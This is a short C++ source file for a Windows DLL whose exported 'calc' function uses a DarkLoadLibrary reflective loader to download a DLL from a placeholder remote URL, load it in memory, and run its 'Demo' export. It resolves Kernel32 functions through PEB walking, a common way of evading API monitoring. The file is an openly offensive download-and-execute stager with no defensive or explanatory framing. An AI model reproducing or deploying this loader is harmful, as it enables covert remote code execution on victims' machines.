// dllmain.cpp : Defines the entry point for the DLL application.

#include <windows.h>
#include "pebutils.h"
#include "sharkloadlibrary.h"

typedef VOID(*_ThisIsAFunction) (VOID);

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

VOID calc() {

	GETPROCESSHEAP pGetProcessHeap = (GETPROCESSHEAP)GetFunctionAddress(IsModulePresent(L"Kernel32.dll"), "GetProcessHeap");
	HEAPFREE pHeapFree = (HEAPFREE)GetFunctionAddress(IsModulePresent(L"Kernel32.dll"), "HeapFree");

	PDARKMODULE DarkModule = DarkLoadLibrary(
		LOAD_REMOTE_FILE,
		"http://xxxx/demo.dll",
		NULL,
		0,
		"Demo"
	);

	if (!DarkModule->bSuccess)
	{
		pHeapFree(pGetProcessHeap(), 0, DarkModule->ErrorMsg);
		pHeapFree(pGetProcessHeap(), 0, DarkModule);
		return;
	}

	_ThisIsAFunction ThisIsAFunction = (_ThisIsAFunction)GetFunctionAddress(
		(HMODULE)DarkModule->ModuleBase,
		"Demo"
	);
	pHeapFree(pGetProcessHeap(), 0, DarkModule);

	if (!ThisIsAFunction)
	{
		return;
	}

	ThisIsAFunction();

	return;
}